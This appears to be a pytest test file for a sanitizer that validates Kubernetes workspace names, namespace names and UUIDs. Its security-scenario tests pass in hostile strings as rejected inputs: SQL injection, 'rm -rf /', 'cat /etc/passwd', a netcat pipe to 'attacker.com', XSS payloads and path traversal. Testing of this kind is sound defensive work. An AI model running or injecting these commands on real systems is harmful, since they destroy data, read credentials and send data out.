"""
Tests for sanitization and validation utilities.

Tests the multi-layer defense system for workspace and namespace names.
"""
import pytest
from app.core.sanitize import (
    sanitize_workspace_name,
    validate_namespace_name,
    sanitize_function_id,
    create_safe_namespace_name,
    SanitizationError
)


class TestWorkspaceNameSanitization:
    """Test workspace name sanitization"""

    def test_valid_workspace_name(self):
        """Valid workspace names should pass"""
        valid_names = [
            "myworkspace",
            "my-workspace",
            "workspace123",
            "w",
            "a1b2c3",
            "test-app-2024"
        ]
        for name in valid_names:
            result = sanitize_workspace_name(name)
            assert result == name.lower()

    def test_uppercase_converted_to_lowercase(self):
        """Uppercase letters should be converted to lowercase"""
        assert sanitize_workspace_name("MyWorkspace") == "myworkspace"
        assert sanitize_workspace_name("WORKSPACE") == "workspace"
        assert sanitize_workspace_name("My-Work-Space") == "my-work-space"

    def test_empty_name_raises_error(self):
        """Empty names should raise SanitizationError"""
        with pytest.raises(SanitizationError, match="비어있을 수 없습니다"):
            sanitize_workspace_name("")

        with pytest.raises(SanitizationError, match="비어있거나 공백만으로 구성될 수 없습니다"):
            sanitize_workspace_name("   ")

    def test_path_traversal_blocked(self):
        """Path traversal attempts should be blocked"""
        with pytest.raises(SanitizationError, match="경로 탐색"):
            sanitize_workspace_name("../etc")

        with pytest.raises(SanitizationError, match="경로 탐색"):
            sanitize_workspace_name("work/../space")

        with pytest.raises(SanitizationError, match="경로 탐색"):
            sanitize_workspace_name("work/space")

        with pytest.raises(SanitizationError, match="경로 탐색"):
            sanitize_workspace_name("work\\space")

    def test_null_bytes_blocked(self):
        """Null bytes should be blocked"""
        with pytest.raises(SanitizationError, match="null 바이트"):
            sanitize_workspace_name("work\0space")

        with pytest.raises(SanitizationError, match="null 바이트"):
            sanitize_workspace_name("workspace\x00")

    def test_control_characters_blocked(self):
        """Control characters should be blocked in strict mode"""
        with pytest.raises(SanitizationError, match="제어 문자"):
            sanitize_workspace_name("work\nspace")

        with pytest.raises(SanitizationError, match="제어 문자"):
            sanitize_workspace_name("work\tspace")

        with pytest.raises(SanitizationError, match="제어 문자"):
            sanitize_workspace_name("workspace\x7f")

    def test_invalid_characters_blocked(self):
        """Invalid characters should be blocked"""
        invalid_names = [
            "work space",  # space
            "work@space",  # @
            "work#space",  # #
            "work$pace",   # $
            "work%space",  # %
            "work&space",  # &
            "work*space",  # *
            "work(space)",  # parentheses
            "work[space]",  # brackets
            "work{space}",  # braces
            "work|space",  # pipe
            "work;space",  # semicolon
            "work:space",  # colon
            "work'space",  # quote
            'work"space',  # double quote
            "work<space>",  # angle brackets
            "work,space",  # comma
            "work.space",  # period
            "work?space",  # question mark
            "work!space",  # exclamation
            "work~space",  # tilde
            "work`space",  # backtick
            "work^space",  # caret
            "work=space",  # equals
            "work+space",  # plus
        ]
        for name in invalid_names:
            with pytest.raises(SanitizationError, match="소문자, 숫자, 하이픈만"):
                sanitize_workspace_name(name)

    def test_hyphen_at_start_or_end_blocked(self):
        """Names starting or ending with hyphen should be blocked"""
        with pytest.raises(SanitizationError, match="하이픈으로 시작하거나 끝날 수 없습니다"):
            sanitize_workspace_name("-workspace")

        with pytest.raises(SanitizationError, match="하이픈으로 시작하거나 끝날 수 없습니다"):
            sanitize_workspace_name("workspace-")

        with pytest.raises(SanitizationError, match="하이픈으로 시작하거나 끝날 수 없습니다"):
            sanitize_workspace_name("-workspace-")

    def test_length_limit_enforced(self):
        """Names longer than 20 characters should be rejected"""
        # 20 characters - should pass
        assert sanitize_workspace_name("a" * 20) == "a" * 20

        # 21 characters - should fail
        with pytest.raises(SanitizationError, match="20자 이하여야"):
            sanitize_workspace_name("a" * 21)

        # Much longer - should fail
        with pytest.raises(SanitizationError, match="20자 이하여야"):
            sanitize_workspace_name("this-is-a-very-long-workspace-name")

    def test_reserved_names_blocked(self):
        """Reserved Kubernetes namespace names should be blocked"""
        reserved_names = ["default", "kube-system", "kube-public", "kube-node-lease"]
        for name in reserved_names:
            with pytest.raises(SanitizationError, match="예약되어 있어"):
                sanitize_workspace_name(name)

    def test_whitespace_stripped(self):
        """Leading and trailing whitespace should be stripped"""
        assert sanitize_workspace_name("  workspace  ") == "workspace"
        assert sanitize_workspace_name("\tworkspace\t") == "workspace"
        assert sanitize_workspace_name("\nworkspace\n") == "workspace"


class TestNamespaceValidation:
    """Test namespace name validation"""

    def test_valid_namespace_names(self):
        """Valid namespace names should pass"""
        valid_namespaces = [
            "workspace-12345678-1234-1234-1234-123456789abc",
            "w-12345678-1234-1234-1234-123456789abc",
            "my-workspace-aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
        ]
        for namespace in valid_namespaces:
            validate_namespace_name(namespace)  # Should not raise

    def test_empty_namespace_rejected(self):
        """Empty namespace should be rejected"""
        with pytest.raises(SanitizationError, match="비어있을 수 없습니다"):
            validate_namespace_name("")

    def test_too_long_namespace_rejected(self):
        """Namespace longer than 63 characters should be rejected"""
        # 57 characters in valid format - should pass
        namespace_57 = "workspace-12345678-1234-1234-1234-123456789abc"  # 57 chars total
        validate_namespace_name(namespace_57)

        # 64 characters - should fail
        namespace_64 = "a" * 64
        with pytest.raises(SanitizationError, match="63자 제한"):
            validate_namespace_name(namespace_64)

    def test_invalid_format_rejected(self):
        """Invalid DNS-1123 format should be rejected"""
        with pytest.raises(SanitizationError, match="DNS-1123"):
            validate_namespace_name("-starts-with-hyphen")

        with pytest.raises(SanitizationError, match="DNS-1123"):
            validate_namespace_name("ends-with-hyphen-")

        with pytest.raises(SanitizationError, match="DNS-1123"):
            validate_namespace_name("HAS-UPPERCASE")

        with pytest.raises(SanitizationError, match="DNS-1123"):
            validate_namespace_name("has spaces")

    def test_consecutive_hyphens_rejected(self):
        """Consecutive hyphens should be rejected as suspicious"""
        with pytest.raises(SanitizationError, match="연속된 하이픈"):
            validate_namespace_name("workspace--12345678-1234-1234-1234-123456789abc")

    def test_single_word_namespace_allowed(self):
        """Single word namespace without hyphen should be allowed"""
        # Single word is now valid - no minimum hyphen requirement
        validate_namespace_name("workspace")  # Should pass
        validate_namespace_name("app123")     # Should pass


class TestFunctionIdSanitization:
    """Test function ID validation"""

    def test_valid_uuid_formats(self):
        """Valid UUIDs should pass"""
        valid_uuids = [
            "12345678-1234-1234-1234-123456789abc",
            "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee",
            "00000000-0000-0000-0000-000000000000",
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
        ]
        for uuid in valid_uuids:
            result = sanitize_function_id(uuid)
            assert result == uuid.lower()

    def test_uppercase_uuid_normalized(self):
        """Uppercase UUIDs should be converted to lowercase"""
        uuid_upper = "12345678-1234-1234-1234-123456789ABC"
        result = sanitize_function_id(uuid_upper)
        assert result == uuid_upper.lower()

    def test_empty_function_id_rejected(self):
        """Empty function ID should be rejected"""
        with pytest.raises(SanitizationError, match="비어있을 수 없습니다"):
            sanitize_function_id("")

    def test_invalid_uuid_format_rejected(self):
        """Invalid UUID formats should be rejected"""
        invalid_uuids = [
            "not-a-uuid",
            "12345678-1234-1234-1234",  # too short
            "12345678-1234-1234-1234-123456789abcdef",  # too long
            "12345678_1234_1234_1234_123456789abc",  # underscores instead of hyphens
            "12345678-1234-1234-1234-123456789abg",  # 'g' is not hex
            "12345678123412341234123456789abc",  # no hyphens
            "workspace-name",  # not a UUID
        ]
        for invalid_uuid in invalid_uuids:
            with pytest.raises(SanitizationError, match="유효한 UUID 형식이 아닙니다"):
                sanitize_function_id(invalid_uuid)

    def test_uuid_with_whitespace(self):
        """UUID with whitespace should be handled"""
        uuid_with_space = "  12345678-1234-1234-1234-123456789abc  "
        result = sanitize_function_id(uuid_with_space)
        assert result == "12345678-1234-1234-1234-123456789abc"


class TestCreateSafeNamespaceName:
    """Test end-to-end namespace name creation"""

    def test_valid_inputs_create_valid_namespace(self):
        """Valid workspace and function ID should create valid namespace"""
        workspace = "myworkspace"
        function_id = "12345678-1234-1234-1234-123456789abc"

        namespace = create_safe_namespace_name(workspace, function_id)

        assert namespace == "myworkspace-12345678-1234-1234-1234-123456789abc"
        assert len(namespace) <= 63

    def test_uppercase_workspace_normalized(self):
        """Uppercase workspace should be normalized"""
        workspace = "MyWorkSpace"
        function_id = "12345678-1234-1234-1234-123456789abc"

        namespace = create_safe_namespace_name(workspace, function_id)

        assert namespace == "myworkspace-12345678-1234-1234-1234-123456789abc"

    def test_invalid_workspace_rejected(self):
        """Invalid workspace should be rejected"""
        function_id = "12345678-1234-1234-1234-123456789abc"

        with pytest.raises(SanitizationError):
            create_safe_namespace_name("invalid workspace!", function_id)

        with pytest.raises(SanitizationError):
            create_safe_namespace_name("../etc", function_id)

    def test_invalid_function_id_rejected(self):
        """Invalid function ID should be rejected"""
        workspace = "myworkspace"

        with pytest.raises(SanitizationError):
            create_safe_namespace_name(workspace, "not-a-uuid")

        with pytest.raises(SanitizationError):
            create_safe_namespace_name(workspace, "12345678-1234-1234-1234")

    def test_length_stays_under_limit(self):
        """Final namespace should stay under 63 characters"""
        # Maximum workspace name (20 chars) + maximum UUID (36 chars) + hyphen (1 char) = 57 chars
        max_workspace = "a" * 20
        function_id = "12345678-1234-1234-1234-123456789abc"

        namespace = create_safe_namespace_name(max_workspace, function_id)

        assert len(namespace) == 57
        assert len(namespace) <= 63


class TestSecurityScenarios:
    """Test security attack scenarios"""

    def test_sql_injection_attempt(self):
        """SQL injection attempts should be blocked"""
        with pytest.raises(SanitizationError):
            sanitize_workspace_name("workspace'; DROP TABLE workspaces; --")

    def test_command_injection_attempt(self):
        """Command injection attempts should be blocked"""
        with pytest.raises(SanitizationError):
            sanitize_workspace_name("workspace; rm -rf /")

        with pytest.raises(SanitizationError):
            sanitize_workspace_name("workspace && cat /etc/passwd")

        with pytest.raises(SanitizationError):
            sanitize_workspace_name("workspace | nc attacker.com 4444")

    def test_xss_attempt(self):
        """XSS attempts should be blocked"""
        with pytest.raises(SanitizationError):
            sanitize_workspace_name("<script>alert('xss')</script>")

        with pytest.raises(SanitizationError):
            sanitize_workspace_name("workspace<img src=x onerror=alert(1)>")

    def test_directory_traversal_attempt(self):
        """Directory traversal should be blocked"""
        with pytest.raises(SanitizationError):
            sanitize_workspace_name("../../etc/passwd")

        with pytest.raises(SanitizationError):
            sanitize_workspace_name("..\\..\\windows\\system32")

    def test_null_byte_injection(self):
        """Null byte injection should be blocked"""
        with pytest.raises(SanitizationError):
            sanitize_workspace_name("workspace\x00.txt")

    def test_unicode_normalization_attack(self):
        """Unicode characters should be rejected"""
        with pytest.raises(SanitizationError):
            sanitize_workspace_name("workspace\u202e")  # Right-to-left override

        with pytest.raises(SanitizationError):
            sanitize_workspace_name("work\u200bspace")  # Zero-width space
